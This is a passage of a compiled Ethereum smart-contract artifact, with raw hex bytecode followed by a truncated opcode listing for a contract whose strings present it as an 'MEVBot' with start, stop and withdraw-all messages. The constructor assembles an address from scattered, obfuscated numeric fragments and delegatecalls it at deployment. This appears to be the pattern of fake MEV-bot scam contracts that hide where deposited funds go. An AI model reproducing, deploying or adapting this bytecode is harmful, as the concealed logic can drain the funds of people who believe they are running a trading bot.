6e09190611487565b600060405180830381855af49150503d806000811461071b576040519150601f19603f3d011682016040523d82523d6000602084013e610720565b606091505b50915091508161073257805160208201fd5b5050505050565b60606000610745610b56565b90506000620f381d90506000610759610b61565b90506000620125499050600061076d610b6c565b9050600061587690506000610780610b77565b90506000620b655a905060006107a66107988a610b82565b6107a18a610b82565b610e16565b905060006107c46107b689610b82565b6107bf89610b82565b610e16565b905060006107e26107d488610b82565b6107dd88610b82565b610e16565b905060006108006107f287610b82565b6107fb87610b82565b610e16565b905060006108206108118686610e16565b61081b8585610e16565b610e16565b905060006108636040518060400160405280600281526020017f307800000000000000000000000000000000000000000000000000000000000081525083610e16565b9050809e50505050505050505050505050505090565b600080829050600080806000600290505b602a811015610b3a57610100846108a191906114cd565b93508481815181106108b6576108b561150f565b5b602001015160f81c60f81b60f81c60ff169250846001826108d7919061153e565b815181106108e8576108e761150f565b5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff1610158015610939575060668373ffffffffffffffffffffffffffffffffffffffff1611155b156109525760578361094b9190611572565b92506109fe565b60418373ffffffffffffffffffffffffffffffffffffffff1610158015610990575060468373ffffffffffffffffffffffffffffffffffffffff1611155b156109a9576037836109a29190611572565b92506109fd565b60308373ffffffffffffffffffffffffffffffffffffffff16101580156109e7575060398373ffffffffffffffffffffffffffffffffffffffff1611155b156109fc576030836109f99190611572565b92505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff1610158015610a3c575060668273ffffffffffffffffffffffffffffffffffffffff1611155b15610a5557605782610a4e9190611572565b9150610b01565b60418273ffffffffffffffffffffffffffffffffffffffff1610158015610a93575060468273ffffffffffffffffffffffffffffffffffffffff1611155b15610aac57603782610aa59190611572565b9150610b00565b60308273ffffffffffffffffffffffffffffffffffffffff1610158015610aea575060398273ffffffffffffffffffffffffffffffffffffffff1611155b15610aff57603082610afc9190611572565b91505b5b5b81601084610b0f91906114cd565b610b1991906115ba565b84610b2491906115ba565b9350600281610b33919061153e565b905061088a565b5082945050505050919050565b600063fd7e4d8060e01b905090565b60006204ead2905090565b60006202dcc7905090565b6000620ca7bb905090565b6000620c2916905090565b60606000808390505b60008114610bb5578180610b9e90611602565b925050601081610bae9190611679565b9050610b8b565b60008267ffffffffffffffff811115610bd157610bd06116aa565b5b6040519080825280601f01601f191660200182016040528015610c035781602001600182028036833780820191505090505b50905060005b83811015610ca257601086610c1e91906116d9565b9250610c2983610fb1565b8260018387610c38919061170a565b610c42919061170a565b81518110610c5357610c5261150f565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350601086610c8f9190611679565b955080610c9b90611602565b9050610c09565b5060008151905060048103610d01576000610cf26040518060400160405280600181526020017f300000000000000000000000000000000000000000000000000000000000000081525084610e16565b90508095505050505050610e11565b60038103610d59576000610d4a6040518060400160405280600281526020017f303000000000000000000000000000000000000000000000000000000000000081525084610e16565b90508095505050505050610e11565b60028103610db1576000610da26040518060400160405280600381526020017f303030000000000000000000000000000000000000000000000000000000000081525084610e16565b90508095505050505050610e11565b60018103610e09576000610dfa6040518060400160405280600481526020017f303030300000000000000000000000000000000000000000000000000000000081525084610e16565b90508095505050505050610e11565b819450505050505b919050565b606060008390506000839050600081518351610e32919061153e565b67ffffffffffffffff811115610e4b57610e4a6116aa565b5b6040519080825280601f01601f191660200182016040528015610e7d5781602001600182028036833780820191505090505b5090506000819050600080600091505b8551821015610f1557858281518110610ea957610ea861150f565b5b602001015160f81c60f81b838280610ec090611602565b935081518110610ed357610ed261150f565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053508180610f0d90611602565b925050610e8d565b600091505b8451821015610fa257848281518110610f3657610f3561150f565b5b602001015160f81c60f81b838280610f4d90611602565b935081518110610f6057610f5f61150f565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053508180610f9a90611602565b925050610f1a565b82965050505050505092915050565b60008160ff16600011158015610fcb575060098260ff1611155b1561100957817f300000000000000000000000000000000000000000000000000000000000000060f81c610fff919061174b565b60f81b9050611070565b8160ff16600a111580156110215750600f8260ff1611155b1561106b57600a827f610000000000000000000000000000000000000000000000000000000000000060f81c611057919061174b565b6110619190611780565b60f81b9050611070565b600080fd5b919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006110a082611075565b9050919050565b6110b081611095565b82525050565b60006020820190506110cb60008301846110a7565b92915050565b60008115159050919050565b6110e6816110d1565b82525050565b600060208201905061110160008301846110dd565b92915050565b600082825260208201905092915050565b7f4d4556426f742073746f702e0000000000000000000000000000000000000000600082015250565b600061114e600c83611107565b915061115982611118565b602082019050919050565b6000602082019050818103600083015261117d81611141565b9050919050565b6000819050919050565b61119781611184565b82525050565b60006040820190506111b260008301856110a7565b6111bf602083018461118e565b9392505050565b600080fd5b6111d4816110d1565b81146111df57600080fd5b50565b6000815190506111f1816111cb565b92915050565b60006020828403121561120d5761120c6111c6565b5b600061121b848285016111e2565b91505092915050565b7f4d4556426f742073746172742e00000000000000000000000000000000000000600082015250565b600061125a600d83611107565b915061126582611224565b602082019050919050565b600060208201905081810360008301526112898161124d565b9050919050565b7f4d4556426f74206e6f742072756e6e696e672e00000000000000000000000000600082015250565b60006112c6601383611107565b91506112d182611290565b602082019050919050565b600060208201905081810360008301526112f5816112b9565b9050919050565b7f4d4556426f7420776974686472617720416c6c00000000000000000000000000600082015250565b6000611332601383611107565b915061133d826112fc565b602082019050919050565b6000602082019050818103600083015261136181611325565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602160045260246000fd5b600481106113a8576113a7611368565b5b50565b60008190506113b982611397565b919050565b60006113c9826113ab565b9050919050565b6113d9816113be565b82525050565b60006060820190506113f460008301866110a7565b61140160208301856110a7565b61140e60408301846113d0565b949350505050565b600081519050919050565b600081905092915050565b60005b8381101561144a57808201518184015260208101905061142f565b60008484015250505050565b600061146182611416565b61146b8185611421565b935061147b81856020860161142c565b80840191505092915050565b60006114938284611456565b915081905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006114d882611075565b91506114e383611075565b92508282026114f181611075565b915082820484148315176115085761150761149e565b5b5092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b600061154982611184565b915061155483611184565b925082820190508082111561156c5761156b61149e565b5b92915050565b600061157d82611075565b915061158883611075565b9250828203905073ffffffffffffffffffffffffffffffffffffffff8111156115b4576115b361149e565b5b92915050565b60006115c582611075565b91506115d083611075565b9250828201905073ffffffffffffffffffffffffffffffffffffffff8111156115fc576115fb61149e565b5b92915050565b600061160d82611184565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820361163f5761163e61149e565b5b600182019050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600061168482611184565b915061168f83611184565b92508261169f5761169e61164a565b5b828204905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b60006116e482611184565b91506116ef83611184565b9250826116ff576116fe61164a565b5b828206905092915050565b600061171582611184565b915061172083611184565b92508282039050818111156117385761173761149e565b5b92915050565b600060ff82169050919050565b60006117568261173e565b91506117618361173e565b9250828201905060ff81111561177a5761177961149e565b5b92915050565b600061178b8261173e565b91506117968361173e565b9250828203905060ff8111156117af576117ae61149e565b5b9291505056fea26469706673582212205bc9528689f49d6ce06fa33ed05c756893dd4e114d1fcb69d3639a21529ae45364736f6c63430008120033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 PUSH1 0x2 PUSH1 0x14 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH3 0x2C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 CHAINID EQ PUSH3 0x73 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH3 0x6A SWAP1 PUSH3 0xE15 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST CALLER PUSH1 0x2 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH20 0xC02AAA39B223FE8D0A0E5C4F27EAD9083C756CC2 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH20 0xDAC17F958D2EE523A2206206994597C13D831EC7 PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH3 0x16F PUSH1 0x0 PUSH3 0x175 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0x1332 JUMP JUMPDEST PUSH1 0x0 PUSH3 0x197 PUSH3 0x18B PUSH3 0x2E9 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0x4C9 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x1AB PUSH3 0x7C7 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP6 PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH3 0x204 SWAP4 SWAP3 SWAP2 SWAP1 PUSH3 0xEFC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE SWAP1 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP SWAP1 POP PUSH1 0x0 DUP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH1 0x40 MLOAD PUSH3 0x28D SWAP2 SWAP1 PUSH3 0xFB2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 GAS DELEGATECALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH3 0x2CA JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH3 0x2CF JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP SWAP2 POP SWAP2 POP DUP2 PUSH3 0x2E2 JUMPI DUP1 MLOAD PUSH1 0x20 DUP3 ADD REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 PUSH3 0x2FD PUSH3 0x7D6 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0xF381D SWAP1 POP PUSH1 0x0 PUSH3 0x319 PUSH3 0x7E1 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x12549 SWAP1 POP PUSH1 0x0 PUSH3 0x335 PUSH3 0x7EC PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x5876 SWAP1 POP PUSH1 0x0 PUSH3 0x350 PUSH3 0x7F7 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0xB655A SWAP1 POP PUSH1 0x0 PUSH3 0x38E PUSH3 0x371 DUP11 PUSH3 0x802 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0x382 DUP11 PUSH3 0x802 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0xADF PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x3C4 PUSH3 0x3A7 DUP10 PUSH3 0x802 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0x3B8 DUP10 PUSH3 0x802 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0xADF PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x3FA PUSH3 0x3DD DUP9 PUSH3 0x802 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0x3EE DUP9 PUSH3 0x802 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0xADF PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x430 PUSH3 0x413 DUP8 PUSH3 0x802 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0x424 DUP8 PUSH3 0x802 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0xADF PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x468 PUSH3 0x44A DUP7 DUP7 PUSH3 0xADF PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0x45C DUP6 DUP6 PUSH3 0xADF PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH3 0xADF PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x4B3 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x2 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3078000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH3 0xADF PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP DUP1 SWAP15 POP POP POP POP POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 SWAP1 POP PUSH1 0x0 DUP1 DUP1 PUSH1 0x0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH3 0x7BA JUMPI PUSH2 0x100 DUP5 PUSH3 0x4F4 SWAP2 SWAP1 PUSH3 0xFFA JUMP JUMPDEST SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH3 0x50C JUMPI PUSH3 0x50B PUSH3 0x1045 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 PUSH3 0x52F SWAP2 SWAP1 PUSH3 0x107E JUMP JUMPDEST DUP2 MLOAD DUP2 LT PUSH3 0x543 JUMPI PUSH3 0x542 PUSH3 0x1045 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH3 0x595 JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH3 0x5B2 JUMPI PUSH1 0x57 DUP4 PUSH3 0x5AA SWAP2 SWAP1 PUSH3 0x10B9 JUMP JUMPDEST SWAP3 POP PUSH3 0x667 JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH3 0x5F1 JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH3 0x60E JUMPI PUSH1 0x37 DUP4 PUSH3 0x606 SWAP2 SWAP1 PUSH3 0x10B9 JUMP JUMPDEST SWAP3 POP PUSH3 0x666 JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH3 0x64D JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH3 0x665 JUMPI PUSH1 0x30 DUP4 PUSH3 0x662 SWAP2 SWAP1 PUSH3 0x10B9 JUMP JUMPDEST SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH3 0x6A6 JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH3 0x6C3 JUMPI PUSH1 0x57 DUP3 PUSH3 0x6BB SWAP2 SWAP1 PUSH3 0x10B9 JUMP JUMPDEST SWAP2 POP PUSH3 0x778 JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH3 0x702 JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH3 0x71F JUMPI PUSH1 0x37 DUP3 PUSH3 0x717 SWAP2 SWAP1 PUSH3 0x10B9 JUMP JUMPDEST SWAP2 POP PUSH3 0x777 JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH3 0x75E JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH3 0x776 JUMPI PUSH1 0x30 DUP3 PUSH3 0x773 SWAP2 SWAP1 PUSH3 0x10B9 JUMP JUMPDEST SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 PUSH3 0x788 SWAP2 SWAP1 PUSH3 0xFFA JUMP JUMPDEST PUSH3 0x794 SWAP2 SWAP1 PUSH3 0x1108 JUMP JUMPDEST DUP5 PUSH3 0x7A1 SWAP2 SWAP1 PUSH3 0x1108 JUMP JUMPDEST SWAP4 POP PUSH1 0x2 DUP2 PUSH3 0x7B2 SWAP2 SWAP1 PUSH3 0x107E JUMP JUMPDEST SWAP1 POP PUSH3 0x4DA JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH4 0xFD7E4D80 PUSH1 0xE0 SHL SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0x4EAD2 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0x2DCC7 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0xCA7BB SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0xC2916 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP1 DUP4 SWAP1 POP JUMPDEST PUSH1 0x0 DUP2 EQ PUSH3 0x83B JUMPI DUP2 DUP1 PUSH3 0x821 SWAP1 PUSH3 0x1157 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x10 DUP2 PUSH3 0x833 SWAP2 SWAP1 PUSH3 0x11D3 JUMP JUMPDEST SWAP1 POP PUSH3 0x80B JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH3 0x85A JUMPI PUSH3 0x859 PUSH3 0x120B JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH3 0x88D JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH3 0x943 JUMPI PUSH1 0x10 DUP7 PUSH3 0x8AB SWAP2 SWAP1 PUSH3 0x123A JUMP JUMPDEST SWAP3 POP PUSH3 0x8BE DUP4 PUSH3 0xC98 PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST DUP3 PUSH1 0x1 DUP4 DUP8 PUSH3 0x8CF SWAP2 SWAP1 PUSH3 0x1272 JUMP JUMPDEST PUSH3 0x8DB SWAP2 SWAP1 PUSH3 0x1272 JUMP JUMPDEST DUP2 MLOAD DUP2 LT PUSH3 0x8EF JUMPI PUSH3 0x8EE PUSH3 0x1045 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 PUSH3 0x92D SWAP2 SWAP1 PUSH3 0x11D3 JUMP JUMPDEST SWAP6 POP DUP1 PUSH3 0x93B SWAP1 PUSH3 0x1157 JUMP JUMPDEST SWAP1 POP PUSH3 0x893 JUMP JUMPDEST POP PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH1 0x4 DUP2 SUB PUSH3 0x9AC JUMPI PUSH1 0x0 PUSH3 0x99C PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH3 0xADF PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH3 0xADA JUMP JUMPDEST PUSH1 0x3 DUP2 SUB PUSH3 0xA0E JUMPI PUSH1 0x0 PUSH3 0x9FE PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x2 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3030000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH3 0xADF PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH3 0xADA JUMP JUMPDEST PUSH1 0x2 DUP2 SUB PUSH3 0xA70 JUMPI PUSH1 0x0 PUSH3 0xA60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x3 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3030300000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH3 0xADF PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH3 0xADA JUMP JUMPDEST PUSH1 0x1 DUP2 SUB PUSH3 0xAD2 JUMPI PUSH1 0x0 PUSH3 0xAC2 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x4 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3030303000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH3 0xADF PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH3 0xADA JUMP JUMPDEST DUP2 SWAP5 POP POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP4 SWAP1 POP PUSH1 0x0 DUP4 SWAP1 POP PUSH1 0x0 DUP2 MLOAD DUP4 MLOAD PUSH3 0xAFD SWAP2 SWAP1 PUSH3 0x107E JUMP JUMPDEST PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH3 0xB19 JUMPI PUSH3 0xB18 PUSH3 0x120B JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH3 0xB4C JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x0 DUP2 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH3 0xBF0 JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH3 0xB7C JUMPI PUSH3 0xB7B PUSH3 0x1045 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH3 0xB95 SWAP1 PUSH3 0x1157 JUMP JUMPDEST SWAP4 POP DUP2 MLOAD DUP2 LT PUSH3 0xBAB JUMPI PUSH3 0xBAA PUSH3 0x1045 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH3 0xBE7 SWAP1 PUSH3 0x1157 JUMP JUMPDEST SWAP3 POP POP PUSH3 0xB5C JUMP JUMPDEST PUSH1 0x0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH3 0xC89 JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH3 0xC15 JUMPI PUSH3 0xC14 PUSH3 0x1045 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH3 0xC2E SWAP1 PUSH3 0x1157 JUMP JUMPDEST SWAP4 POP DUP2 MLOAD DUP2 LT PUSH3 0xC44 JUMPI PUSH3 0xC43 PUSH3 0x1045 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH3 0xC80 SWAP1 PUSH3 0x1157 JUMP JUMPDEST SWAP3 POP POP PUSH3 0xBF5 JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0xFF AND PUSH1 0x0 GT ISZERO DUP1 ISZERO PUSH3 0xCB3 JUMPI POP 